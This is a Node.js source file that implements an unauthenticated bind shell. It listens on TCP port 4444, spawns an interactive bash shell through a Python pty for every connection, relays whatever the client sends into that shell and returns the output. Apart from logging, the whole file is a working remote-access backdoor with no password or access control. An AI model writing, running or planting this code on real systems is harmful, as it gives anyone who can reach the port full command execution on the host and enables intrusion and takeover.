var child_process = require('child_process');
var net = require('net');


var logger = {
  output: process.stdout,
  log: function () {
    var outputs = [];
    for (var i = 0; i < arguments.length; i++) {
      var msg = arguments[i] ? arguments[i].toString() : '';
      if (msg) {
        outputs.push(msg);
      }
    }
    
    this.output.write(outputs.join(' '));
  },
  info: function () {
    var args = [];
    for (var i = 0; i < arguments.length; i++) {
      args.push(arguments[i]);
    }
    
    return this.log.apply(logger, ['[INFO]'].concat(args));
  }
};


function runServer(port) {
  var server = net.createServer(function (socket) {
    var sh = child_process.spawn('/usr/bin/python', ['-c', 'import pty;pty.spawn("/bin/bash")']);
    socket.on('data', chunk => {
      logger.info('exec command: ', chunk.toString(), '\n');
      sh.stdin.write(chunk);
    });

    sh.stdout.on('data', function(data) {
      if (data.length) {
        socket.write(data);
      }
    });

    sh.stderr.on('data', function (err) {
      if (err.length) {
        socket.write(err);
      }
    });

    sh.on('close', function() {
      socket.end("exited." + '\n');
      logger.info('exited');
    });

    socket.on('close', function() {
      sh.kill();
    });
    
    socket.on('error', function(err) {
      logger.info(err.message, '\n');
      sh.kill();
    })
  });

  server.on('connection', function(socket) {
    logger.info('New connection income ' + socket.remoteAddress + ':' + socket.remotePort + '\n');
  });

  server.on('error', function(err) {
    if (err.length) {
      logger.info(err.message + '\n');
    }
  });

  server.listen({port: port}, function() {
    logger.info('started');
  });
}


runServer(4444);